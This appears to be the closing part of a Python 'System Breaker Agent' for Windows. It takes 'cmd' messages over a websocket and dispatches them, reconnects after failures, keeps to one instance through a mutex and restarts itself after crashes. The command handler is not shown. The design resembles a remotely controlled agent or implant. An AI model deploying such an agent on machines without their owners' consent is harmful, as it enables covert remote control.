                async for message in ws:
                    data = json.loads(message)
                    if data.get("type") == "cmd":
                        asyncio.create_task(handle_command(ws, data))

        except websockets.exceptions.ConnectionClosed as e:
            log.warning(f"Connection closed ({e.code}). Reconnecting in 10s…"); secret = None
        except OSError as e:
            log.warning(f"Network offline: {e}. Retry in 10s…"); secret = None
        except Exception as e:
            log.error(f"Unexpected neural loop crash: {e}. Retry in 10s…"); secret = None

        await asyncio.sleep(10)

if __name__ == "__main__":
    # ── Đảm bảo chỉ có duy nhất một phiên bản System Breaker hoạt động trên máy tránh xung đột cướp tài nguyên ────
    import ctypes
    _MUTEX_NAME = "SystemBreaker_SingleInstance"
    _mutex_handle = ctypes.windll.kernel32.CreateMutexW(None, True, _MUTEX_NAME)
    if ctypes.windll.kernel32.GetLastError() == 183:   # ERROR_ALREADY_EXISTS
        log.warning("Another System Breaker Agent instance already running. Exiting.")
        sys.exit(0)
    # ────────────────────────────────────────────────────────────────────────
    log.info(f"Agent started. Device={DEVICE_ID}")
    async def _main():
        await _ensure_aumid()
        await run()
    import time as _time
    while True:
        try:
            asyncio.run(_main())
        except Exception as _e:
            log.error(f"Fatal Neural Core Crash: {_e}. Restarting neural loop in 30s…")
            _time.sleep(30)
